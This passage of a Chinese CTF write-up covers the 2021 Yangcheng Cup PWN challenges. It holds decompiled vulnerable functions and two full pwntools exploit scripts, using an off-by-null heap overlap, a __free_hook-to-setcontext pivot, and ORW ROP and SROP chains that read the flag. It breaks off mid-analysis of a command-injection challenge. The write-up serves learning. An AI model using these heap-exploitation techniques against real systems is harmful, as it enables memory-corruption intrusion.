        <content type="html"><![CDATA[<h1 id="2021·第二届羊城杯WP"><a href="#2021·第二届羊城杯WP" class="headerlink" title="2021·第二届羊城杯WP"></a>2021·第二届羊城杯WP</h1><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>还是没能写出很多题，不过对于那些题至少能看的明白，知道大概的思路是什么了…还需继续努力</p><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="what-you-name"><a href="#what-you-name" class="headerlink" title="what you name"></a>what you name</h4><p>保护全开<code>+</code>沙箱<code>execve</code>被禁，现在的比赛题就各种<code>ORW</code>…有点套板子的意思了…</p><p><code>free</code>函数，没有清空堆块本身的指针，存在地址泄露</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_FF2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_C27(&amp;v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(*((_QWORD *)&amp;unk_202188 + <span class="number">2</span> * v1) + <span class="number">8LL</span>));</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)&amp;unk_202188 + <span class="number">2</span> * v1));</span><br><span class="line">    *((_DWORD *)&amp;unk_202180 + <span class="number">4</span> * v1) = <span class="number">0</span>;</span><br><span class="line">    *((_DWORD *)&amp;unk_202184 + <span class="number">4</span> * v1) = <span class="number">0</span>;</span><br><span class="line">    *((_QWORD *)&amp;unk_202188 + <span class="number">2</span> * v1) = <span class="number">0LL</span>;</span><br><span class="line">    --dword_20204C;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看<code>bin</code>的时候，发现有个<code>unsorted bin</code>的堆块，直接<code>add</code>出来泄露<code>main_arena + 88</code>，省心</p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/18.png" class=""><p><code>edit</code>函数里头有<code>off-by-one</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_D0C</span><span class="params">(<span class="keyword">int</span> a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">    byte_202060[i] = <span class="number">0</span>;</span><br><span class="line">  v5 = read(<span class="number">0</span>, byte_202060, a1);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)((<span class="keyword">int</span>)j + a2) = byte_202060[j];</span><br><span class="line">    result = j;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">int</span>)j &gt;= v5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="解法一：常规ORW"><a href="#解法一：常规ORW" class="headerlink" title="解法一：常规ORW"></a>解法一：常规ORW</h5><p>常规<code>off-by-null</code>制造堆叠</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0xf0</span>+p64(<span class="number">0x200</span>))</span><br><span class="line">delete(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>修改<code>free_hook</code>为<code>setcontext+53</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>)+p64(free_hook)[:<span class="number">7</span>])</span><br><span class="line">edit(<span class="number">8</span>,p64(setcontext)[:<span class="number">7</span>])</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># elf = ELF(&#x27;name&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./name&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">a</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(a))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(a))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;name:\n&#x27;</span>,b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">a</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(a))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">a</span>):</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(a))</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *$rebase(0xFF2)&quot;</span>)</span><br><span class="line">add(<span class="number">0xe8</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arean_xx = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;main_arean_xx:&quot;</span>,<span class="built_in">hex</span>(main_arean_xx)</span><br><span class="line">libc_base = main_arean_xx - <span class="number">88</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base:&quot;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#1#0x555555757490 - 0x555555757b40</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#6</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#7 protect</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0xf0</span>+p64(<span class="number">0x200</span>))</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>)<span class="comment">#9</span></span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_addr:&quot;</span>,<span class="built_in">hex</span>(heap_addr)</span><br><span class="line">target_addr = heap_addr - (<span class="number">0x5555557575b0</span>-<span class="number">0x0000555555758070</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;target_addr:&quot;</span>,<span class="built_in">hex</span>(target_addr)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000021112</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x00000000000202f8</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x0000000000001b92</span></span><br><span class="line">pop_rdx_rsi_ret = libc_base + <span class="number">0x00000000001151c9</span></span><br><span class="line">ret         = libc_base + <span class="number">0x0000000000000937</span></span><br><span class="line">open_addr   = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr   = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr  = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;setcontext:&quot;</span>,<span class="built_in">hex</span>(setcontext)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;free_hook:&quot;</span>,<span class="built_in">hex</span>(free_hook)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># edit(8,&quot;./flag\x00&quot;)</span></span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>)+p64(free_hook)[:<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,p64(setcontext)[:<span class="number">7</span>])</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">&#x27;./flag\x00\x00&#x27;</span>*<span class="number">20</span>+p64(target_addr)+p64(ret))</span><br><span class="line"></span><br><span class="line">flag_addr = heap_addr-(<span class="number">0x5555557575b0</span>-<span class="number">0x555555757d70</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode + rop ==&gt; orw</span></span><br><span class="line">orw = p64(pop_rdi_ret) + p64(flag_addr)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(<span class="number">0x0</span>)</span><br><span class="line">orw += p64(open_addr)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(pop_rdx_rsi_ret) + p64(<span class="number">0x100</span>) + p64(heap_addr+<span class="number">0x440</span>)</span><br><span class="line">orw += p64(read_addr)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(pop_rdx_rsi_ret) + p64(<span class="number">0x100</span>) + p64(heap_addr+<span class="number">0x400</span>)</span><br><span class="line">orw += p64(write_addr)</span><br><span class="line">edit(<span class="number">1</span>,orw)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h5 id="解法二：SROP-ORW"><a href="#解法二：SROP-ORW" class="headerlink" title="解法二：SROP+ORW"></a>解法二：SROP+ORW</h5><p>基本上没有什么太大变化，只是后面用SROP来读入ORW链到<code>bss</code>段上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = rop_chain_addr</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = rop_chain_addr</span><br><span class="line">frame.rdx = <span class="number">0x100</span></span><br><span class="line">frame.rip = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br></pre></td></tr></table></figure><p>用<code>show</code>来进行栈迁移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">4</span>, p64(libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span>) + p64(libc.bss()))</span><br><span class="line">show(<span class="number">7</span>)</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">local= <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    sh = process(<span class="string">&#x27;./name&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;name size:\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, name</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;name:\n&#x27;</span>, name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_exit</span>():</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">gdb.attach(sh,<span class="string">&quot;b *$rebase(0xF79)&quot;</span>)</span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x21112</span></span><br><span class="line">pop_rsi_ret_addr = <span class="number">0x202f8</span></span><br><span class="line">pop_rdx_rsi_ret_addr = <span class="number">0x1151C9</span></span><br><span class="line">pop_rax_ret_addr = <span class="number">0x3a738</span></span><br><span class="line">syscall_ret_addr = <span class="number">0xbc3f5</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 0</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc.address = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3C4B20</span>- <span class="number">312</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0xf0</span>+ p64(<span class="number">0x200</span>))</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0xd0</span>) <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment"># 7</span></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">pop_rdi_ret_addr += libc.address</span><br><span class="line">pop_rsi_ret_addr += libc.address</span><br><span class="line">pop_rdx_rsi_ret_addr += libc.address</span><br><span class="line">pop_rax_ret_addr += libc.address</span><br><span class="line">syscall_ret_addr += libc.address</span><br><span class="line"></span><br><span class="line">rop_chain_addr = libc.bss()+<span class="number">0x200</span></span><br><span class="line">str_flag_addr = rop_chain_addr + <span class="number">0x80</span></span><br><span class="line">flag_addr = libc.bss() + <span class="number">0x300</span></span><br><span class="line"></span><br><span class="line">rop_chain = p64(pop_rdi_ret_addr) + p64(str_flag_addr) </span><br><span class="line">rop_chain += p64(pop_rsi_ret_addr) + p64(<span class="number">0</span>) </span><br><span class="line">rop_chain += p64(pop_rax_ret_addr) + p64(<span class="number">2</span>) </span><br><span class="line">rop_chain += p64(syscall_ret_addr)</span><br><span class="line">rop_chain += p64(pop_rdi_ret_addr) + p64(<span class="number">3</span>) </span><br><span class="line">rop_chain += p64(pop_rdx_rsi_ret_addr) + p64(<span class="number">0x50</span>) + p64(flag_addr) </span><br><span class="line">rop_chain += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop_chain += p64(pop_rdi_ret_addr) + p64(flag_addr) </span><br><span class="line">rop_chain += p64(libc.sym[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(rop_chain))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, p64(libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span>) + p64(libc.bss()))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line"><span class="comment"># frame[&#x27;uc_stack.ss_size&#x27;] = libc.sym[&#x27;setcontext&#x27;] + 61</span></span><br><span class="line">frame.rsp = rop_chain_addr</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = rop_chain_addr</span><br><span class="line">frame.rdx = <span class="number">0x100</span></span><br><span class="line">frame.rip = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">edit(<span class="number">7</span>, <span class="built_in">str</span>(frame))</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">sh.send(rop_chain+<span class="string">&#x27;./flag\x00&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="nologin"><a href="#nologin" class="headerlink" title="nologin"></a>nologin</h4><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/1.png" class=""><p>保护很红呀</p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/2.png" class="" width="2"><p>程序就两个流程一个是<code>user</code>，一个是<code>admin</code>，先来看看<code>user</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;======================== users ========================&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Sorry,you are only allowed to :&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;1. w&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;2. ls&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;3. pwd&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;4. cat&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;5. rename&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;6. quit&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Now you can input the number and execute it:\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>里面就是各种用户态的命令，不过最终都会跳到这，拼接命令最后<code>system</code>执行，这里执行的是<code>xxx &gt; ./result</code>，就是把某某文件写入到<code>result</code>里面去，比赛的时候一直想命令注入，但是这再怎么注入都不可能执行<code>system(&quot;/bin/sh&quot;)</code>的…，它只会把执行命令后的结果写入到<code>result</code>里面去</p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/3.png" class=""><p>再来看一些关键的命令，<code>cat</code>命令，就是<code>cat &amp;s</code>的内容</p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/4.png" class=""><p><code>input_file_name</code>里面就是读入文件名，里面可以进行<code>&quot;\00&quot;</code>截断，至于为什么要截断，往下看</p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/5.png" class=""><p><code>sub_400AC3</code>里面居然在随机我们的文件名，所以你应该知道为什么要截断了吧</p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/6.png" 